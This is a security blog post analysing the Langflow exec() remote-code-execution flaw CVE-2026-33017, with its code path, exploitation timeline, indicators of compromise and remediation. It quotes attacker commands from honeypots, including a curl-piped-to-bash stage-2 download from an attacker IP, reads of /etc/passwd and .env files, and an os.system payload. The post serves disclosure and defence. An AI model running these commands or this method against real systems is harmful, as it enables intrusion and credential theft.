---
slug: langflow-exec-rce-cve-2026-33017
title: "Langflow Got Hacked Twice Through the Same exec() Call. Your AI Stack Probably Has the Same Problem."
description: "CVE-2026-33017 (CVSS 9.3) is an unauthenticated RCE in Langflow exploited within 20 hours of disclosure. Attackers harvested OpenAI, Anthropic, and AWS keys from live instances."
authors: [dhaya]
tags: [security, langflow, rce, CVE, vulnerability, ai]
image: /img/blog/og-langflow.png
---


Langflow fixed a critical RCE last year. Attackers just found the same unsandboxed `exec()` call on a different endpoint, and exploited it in 20 hours flat, with no public proof-of-concept code.

CVE-2026-33017 (CVSS 9.3, Critical) is an unauthenticated remote code execution vulnerability affecting all Langflow versions through 1.8.1, fixed in 1.9.0. Within 20 hours of the advisory going public on March 17, 2026, attackers built working exploits from the advisory text alone and began harvesting API keys for OpenAI, Anthropic, and AWS from compromised instances.

The important part for anyone running AI orchestration tools: the fix for the first vulnerability (CVE-2025-3248) was structurally incapable of preventing this one, because the vulnerable endpoint is designed to be unauthenticated. This is a case study in why AI orchestration tools demand security review at the architecture level, not just the endpoint level.

<!-- truncate -->

---

## From HTTP request to arbitrary code execution in 10 steps

The vulnerable endpoint is `POST /api/v1/build_public_tmp/{flow_id}/flow`, located in `src/backend/base/langflow/api/v1/chat.py` at line 580. This endpoint exists to let unauthenticated users interact with public flows, the mechanism that powers most Langflow-based chatbots in production. A user visits a shared link, chats with the bot, and the server builds and executes the flow behind the scenes. No login required. That is by design.

The problem is a single parameter. The endpoint accepts an optional `data` field in the request body. When `data` is `None`, the server loads the flow definition from its database, the safe path. When `data` is provided, the server uses the caller's flow definition instead. This convenience feature, intended for the authenticated build endpoint at line 138 where logged-in users test modified flows, was copied to the public endpoint without restriction. An unauthenticated attacker can submit a fabricated flow definition containing arbitrary Python code in node definitions, and the server will compile and execute it.

The code execution chain traverses **10 function calls** from HTTP request to shell access:

1. `start_flow_build(data=attacker_data)` calls `generate_flow_events()` in `build.py:81`
2. `create_graph()` calls `build_graph_from_data(payload=data.model_dump())` in `build.py:298`
3. `Graph.from_payload(payload)` parses attacker-supplied nodes in `base.py:1168`
4. `add_nodes_and_edges()` → `initialize()` → `_build_graph()` in `base.py:270,527`
5. `_instantiate_components_in_vertices()` iterates each node in `base.py:1323`
6. `vertex.instantiate_component()` calls `instantiate_class(vertex)` in `loading.py:28`
7. `code = custom_params.pop("code")` extracts the attacker's Python from the node template in `loading.py:43`
8. `eval_custom_component_code(code)` calls `create_class(code, class_name)` in `eval.py:9`
9. `prepare_global_scope(module)` processes the code's AST in `validate.py:323`
10. **`exec(compiled_code, exec_globals)`** executes arbitrary code at `validate.py:397`

The critical function is `prepare_global_scope` in `src/lfx/src/lfx/custom/validate.py`. It copies the current `globals()`, resolves imports via `importlib.import_module()` (any module, unrestricted), then collects all top-level AST definitions, including `ast.Assign`, `ast.ClassDef`, and `ast.FunctionDef`, compiles them into a single `ast.Module`, and passes that to `exec()`. The key detail: **`ast.Assign` nodes are executed during graph building, before the flow ever "runs."** An attacker payload like `_x = os.system("id")` is an assignment statement. It executes the moment `prepare_global_scope` processes the node definitions. There is zero sandboxing, zero AST filtering, and zero restriction on which modules can be imported.

Three CWE classifications apply: **CWE-94** (Code Injection), **CWE-95** (Eval Injection), and **CWE-306** (Missing Authentication for Critical Function). CISA's ADP Vulnrichment assessment classifies the technical impact as **"total"** and confirms the vulnerability is **automatable**.

Prerequisites for exploitation are minimal. The target instance needs at least one public flow (standard for any Langflow deployment serving a chatbot). The attacker needs that flow's UUID, discoverable from shared URLs. When `AUTO_LOGIN=true`, **which is the default**, an attacker can call `GET /api/v1/auto_login` to get a superuser token, create their own public flow, and then exploit it. As researcher Aviral Srivastava told The Hacker News: "One HTTP POST request with malicious Python code in the JSON payload is enough to achieve immediate remote code execution."

---

## Why Langflow got hit with the same vulnerability class twice

CVE-2026-33017 is the architectural sequel to **CVE-2025-3248**, a CVSS 9.8 unauthenticated RCE disclosed in early 2025 that was actively exploited by the Flodrix botnet and added to CISA's Known Exploited Vulnerabilities catalog on May 5, 2025. That vulnerability lived on a different endpoint, `POST /api/v1/validate/code`, which accepted arbitrary Python and passed it to `exec()` without authentication. The fix was straightforward: the Langflow team added `Depends(get_current_active_user)` to the endpoint in PR #6911, requiring a valid JWT token.

But the underlying `exec()` mechanism was never modified. The patches only gated access; the unsandboxed execution remained available to authenticated users. And crucially, nobody audited the other endpoints that fed user input into the same `exec()` pipeline. Srivastava's discovery methodology was precisely this: he started by reading what was already fixed, then searched for the same pattern everywhere the developers didn't look.

"I was reading `src/backend/base/langflow/api/v1/chat.py` and comparing two endpoints side by side," Srivastava wrote in his Medium post. "The authenticated build endpoint at line 138 and the public build endpoint at line 580 accept the exact same `data` parameter and feed it into the exact same pipeline." The only difference was that the authenticated endpoint required `current_user: CurrentActiveUser` and the public endpoint did not.

The fix for CVE-2026-33017 could not replicate the fix for CVE-2025-3248. Adding authentication to `build_public_tmp` would break the entire public flows feature. Srivastava stated this directly: "You can't just add an auth requirement without breaking the entire public flows feature. The real fix is removing the `data` parameter from the public endpoint entirely, so public flows can only execute their stored (server-side) flow data and never accept attacker-supplied definitions."

| Dimension | CVE-2025-3248 | CVE-2026-33017 |
|---|---|---|
| **Endpoint** | `/api/v1/validate/code` | `/api/v1/build_public_tmp/{flow_id}/flow` |
| **CVSS** | 9.8 (v3.1) | 9.3 (v4.0) |
| **Execution path** | `validate_code()` → `exec()` | `create_class()` → `prepare_global_scope()` → `exec()` |
| **Fix** | Added authentication decorator | Removed `data` parameter entirely |
| **Auth fixable?** | Yes | No, endpoint is unauthenticated by design |
| **CISA KEV** | Yes (May 5, 2025) | Not yet (as of March 22, 2026) |

PR #12160, authored by Janardan S. Kavia and merged on March 10, 2026, changed just 11 lines across two files. The `data` parameter was removed from the function signature. The `start_flow_build` call was hardcoded to `data=None` with the comment `# Always None - public flows load from database only`. The commit hash is `73b6612e3ef25fdae0a752d75b0fabd47328d4f0`.

---

## Twenty hours from advisory to exploitation, with no public PoC

The disclosure-to-exploitation timeline for CVE-2026-33017 compresses what historically took months into less than a single day.

| Date (2026) | Event |
|---|---|
| **February 25** | Srivastava reports via GitHub Security Advisory |
| **March 10** | Langflow acknowledges; fix merged in PR #12160 |
| **March 16** | Advisory GHSA-vwmf-pq79-vjvx published on GitHub |
| **March 17** | CVE-2026-33017 assigned; advisory publicly visible at ~20:05 UTC |
| **March 18, 16:04 UTC** | First exploitation attempt observed by Sysdig (~20 hours later) |
| **March 18, ~20:55 UTC** | First successful data exfiltration (~25 hours) |
| **March 20** | NVD publishes CVE entry; Sysdig and The Hacker News publish coverage |

Sysdig's Threat Research Team deployed honeypot Langflow instances across multiple cloud providers within hours of the advisory. What they observed over 48 hours, documented in their March 19 blog post, reveals a three-phase attack pattern from **6 unique source IPs**, and the attackers had no public PoC to work from.

**Phase 1: Automated nuclei scanning (hours 20-21).** Four IPs arrived within minutes of each other, all sending identical payloads. The cookie header contained `client_id=nuclei-scanner`, and created flows were named `nuclei-cve-2026-33017`. One IP (205.237.106.117) rotated through 7 user-agent strings from nuclei's random wordlist, including `Knoppix` and `Fedora; Linux i686`. The payload was identical across all four: execute `id`, base64-encode the output, exfiltrate via HTTP to an interactsh callback server. Sysdig confirmed that **no CVE-2026-33017 template existed in the official nuclei-templates repository**. These were privately authored and deployed at scale within hours of disclosure.

**Phase 2: Custom Python exploitation (hours 21-24).** A different attacker at IP 83.98.164.238 used `python-requests/2.32.3` with no user-agent rotation. The kill chain was methodical: directory listing (`ls -al /root; ls /app`), credential file access (`cat /etc/passwd`), system fingerprinting (`id` returned `uid=1000(langflow)`), then stage-2 delivery via `bash -c "$(curl -fsSL http://173.212.205.251:8443/z)"`. The stage-2 dropper URL indicates the attacker had pre-staged infrastructure ready to deploy once they confirmed a vulnerable target.

**Phase 3: Data harvesting (hours 24-30).** IP 173.212.205.251 executed `env` to dump all environment variables (database connection strings, API keys, cloud credentials), then ran `find /app -name "*.db" -o -name "*.env"` to locate configuration files and databases, followed by targeted reads of `.env` files. Both the Phase 2 and Phase 3 IPs exfiltrated to the same C2 server at **143.110.183.86:8080**, strongly suggesting a single operator using multiple VPS nodes.

### Indicators of compromise

**Attacker IPs:** 77.110.106.154 (DE, AEZA GROUP), 209.97.165.247 (SG, DigitalOcean), 188.166.209.86 (SG, DigitalOcean), 205.237.106.117 (FR, PUSHPKT), 83.98.164.238 (NL, Accenture B.V.), 173.212.205.251 (FR, Contabo GmbH). **C2 infrastructure:** 143.110.183.86:8080 (data exfiltration receiver), 173.212.205.251:8443 (stage-2 dropper at `/z`). **Callback domains:** 12 unique interactsh subdomains across `.oast.live`, `.oast.me`, `.oast.pro`, and `.oast.fun` TLDs. Defenders should monitor for outbound connections to `oastify.com`, `interact.sh`, and `dnslog.cn`.

---

## What attackers harvested and why Langflow instances are high-value targets

Langflow instances are configured to connect to external AI services and data stores. A compromised instance yields not just server access but **lateral access into an organization's entire AI infrastructure**. Sysdig documented attackers targeting:

- **LLM provider API keys** for OpenAI, Anthropic, and other providers configured in environment variables. These keys often have unrestricted spend limits and can be used for credential abuse or resold.
- **AWS credentials and cloud tokens** enabling lateral movement into cloud accounts, S3 buckets, and connected services.
- **Database connection strings** for PostgreSQL, MySQL, and vector databases stored in `.env` files, providing access to all flow data, user messages, and stored embeddings.
- **Configuration files** including `.db` and `.env` files across the filesystem containing application secrets, internal service URLs, and deployment configurations.

---

## This is not just a Langflow problem

CVE-2026-33017 sits within a growing pattern of critical RCE vulnerabilities across AI workflow tools that treat code execution as a feature rather than a security boundary.

**n8n disclosed CVE-2026-27577 (CVSS 9.4) in March 2026**, an expression sandbox escape allowing authenticated users to achieve full RCE. A companion vulnerability, CVE-2026-27493 (CVSS 9.5), enabled unauthenticated expression injection through Form nodes. When chained, these escalated from public form input to complete server takeover. The Shadowserver Foundation reported **24,700+ unpatched n8n instances** exposed online. A related predecessor, CVE-2025-68613, was added to CISA KEV with active exploitation confirmed.

The pattern is structural, not incidental. Langflow uses Python `exec()` for component code evaluation. n8n uses a JavaScript expression engine with a sandbox that has been bypassed multiple times. MetaGPT, LangChain, AutoGen, and SWE-Agent all execute code through subprocess or `exec()`. The 2026 OWASP Top 10 for Agentic AI Security Risks warns explicitly: "A code-generating agent that runs its output in an unsandboxed environment gives attackers a direct path to remote code execution on your infrastructure." Data science and ML teams deploy these tools outside standard security review cycles, often directly exposed to the internet with default configurations, and the time-to-exploit window is collapsing in parallel. The Zero Day Clock project documents median time-to-exploit falling from **771 days in 2018 to 4 hours in 2024**. CVE-2026-33017's 20-hour exploitation window is consistent with this trend.

---

## How the researcher found it by reading the code they already fixed

Srivastava's methodology is worth studying. He is a Security Engineer at Amazon specializing in offensive security research at the intersection of AI systems and exploitation, with publications in ICLR, NeurIPS, and ACM, and recognition as an RSA Security Scholar (2025).

His approach was pattern-based: start with what was already patched, then search for the same pattern everywhere the developers didn't look. "In early 2025, CISA added CVE-2025-3248 to their Known Exploited Vulnerabilities catalog," he wrote. "The fix was straightforward: the Langflow team added an authentication check to the endpoint and moved on. I found the same class of vulnerability on a different endpoint. Same codebase. Same `exec()` call at the end of the chain. Same zero sandboxing."

He tested against Langflow 1.7.3, the latest stable release at the time. Six runs, six confirmed executions, **100% reproducibility**. He reported through Langflow's GitHub Security Advisory on February 25, 2026. There was a process hiccup: after the fix was merged on March 10, the advisory was initially closed without being published. Srivastava explained why publication matters: no CVE assignment means no Dependabot alerts, no tracking for downstream projects, no public record. The Langflow team reopened and published the advisory. "The maintainer handling the advisory was upfront about the security process being new to them, and I appreciated that," Srivastava wrote. "Not every vendor is that responsive."

His closing advice targets the root cause: "If you've fixed a vulnerability in your codebase before, go back and check whether the same pattern exists somewhere else. The first fix is rarely the last one needed."

---

## Remediation and what to do right now

CVE-2026-33017 has **not been added to CISA's Known Exploited Vulnerabilities catalog** as of March 22, 2026, despite confirmed active exploitation. For comparison, CVE-2025-3248 took approximately one month from patch release to KEV addition.

Organizations running Langflow should take the following steps immediately:

- **Update to Langflow 1.9.0** or apply the fix from commit `73b6612`. Every version through 1.8.1 is vulnerable.
- **Audit environment variables and secrets** on any Langflow instance that has been exposed to the internet. Assume compromise if the instance was publicly accessible before patching.
- **Rotate all credentials**: API keys for OpenAI, Anthropic, AWS, and any other configured provider. Rotate database passwords and cloud tokens. Revoke and reissue OAuth tokens.
- **Set `AUTO_LOGIN=false`** in production. The default `AUTO_LOGIN=true` allows unauthenticated users to obtain superuser tokens and create public flows, satisfying all exploitation prerequisites.
- **Monitor for outbound connections** to callback services including `oastify.com`, `interact.sh`, `dnslog.cn`, and interactsh domains (`.oast.live`, `.oast.me`, `.oast.pro`, `.oast.fun`).
- **Restrict network access.** Never expose Langflow directly to the internet. Place it behind a reverse proxy with authentication, or restrict access to known IP ranges via firewall rules.
- **Inventory all AI/ML tooling** in the environment. Any tool that executes user-supplied or LLM-generated code should be treated as a high-risk asset.

---

## FAQ

**Is this the same vulnerability as CVE-2025-3248?**

No. CVE-2025-3248 affected the `/api/v1/validate/code` endpoint and was fixed by adding an authentication requirement. CVE-2026-33017 affects a different endpoint, `/api/v1/build_public_tmp/{flow_id}/flow`, which is unauthenticated by design. Both vulnerabilities use the same underlying `exec()` call in the codebase, but they are distinct CVEs with different attack vectors and different fixes.

**Which Langflow versions are affected?**

All versions up to and including 1.8.1 are affected. The fix is available in version 1.9.0. The specific patch commit is `73b6612e3ef25fdae0a752d75b0fabd47328d4f0`, merged in PR #12160 on March 10, 2026.

**Is this being actively exploited?**

Yes. Sysdig observed the first exploitation attempts within 20 hours of the advisory publication on March 17, 2026. Attackers used both automated nuclei scanning and custom Python exploit scripts to target exposed Langflow instances. No public proof-of-concept code existed at the time of first exploitation.

**Has CVE-2026-33017 been added to CISA's KEV catalog?**

Not as of March 22, 2026, despite confirmed active exploitation. CVE-2025-3248, the predecessor vulnerability, was added to KEV in May 2025.

**What data is at risk on a compromised Langflow instance?**

Attackers have been observed targeting LLM provider API keys (OpenAI, Anthropic), AWS credentials, database connection strings, and configuration files. A compromised Langflow instance can provide lateral access into an organization's cloud accounts, AI services, and data stores.

**Does the GraphQL API have the same vulnerability?**

No. The vulnerability is specific to the REST API endpoint. Langflow's GraphQL mutations use a different code path that is not affected.

**Is `AUTO_LOGIN=true` required for exploitation?**

Not strictly. If the target instance already has at least one public flow, an attacker only needs that flow's UUID. However, `AUTO_LOGIN=true` (which is the default) allows an attacker to create their own public flow without any credentials, removing that prerequisite entirely.

**Are other AI workflow tools affected by this specific CVE?**

No. CVE-2026-33017 is specific to Langflow. However, the same class of vulnerability (unsandboxed code execution in AI orchestration tools) has been found in n8n (CVE-2026-27577, CVE-2026-27493), and the pattern exists across multiple AI agent frameworks that use `exec()`, `eval()`, or subprocess-based code execution.

**What should I monitor for to detect exploitation attempts?**

Monitor for outbound connections to interactsh callback domains (`.oast.live`, `.oast.me`, `.oast.pro`, `.oast.fun`), `oastify.com`, `interact.sh`, and `dnslog.cn`. Check logs for unusual POST requests to `/api/v1/build_public_tmp/` endpoints with `data` parameters. Review network traffic for connections to the known C2 IPs: 143.110.183.86:8080 and 173.212.205.251:8443.

**Where can I find the full technical advisory?**

The GitHub Security Advisory is published at GHSA-vwmf-pq79-vjvx. The original researcher's writeup is available on Medium under Aviral Srivastava's account. Sysdig's honeypot analysis with attacker IOCs is published on the Sysdig blog.

---

*Written by Dhayabaran V, Founder of Barrack AI. We provide GPU cloud infrastructure for AI workloads with per-minute billing and zero egress fees. [Learn more →](https://barrack.ai)*
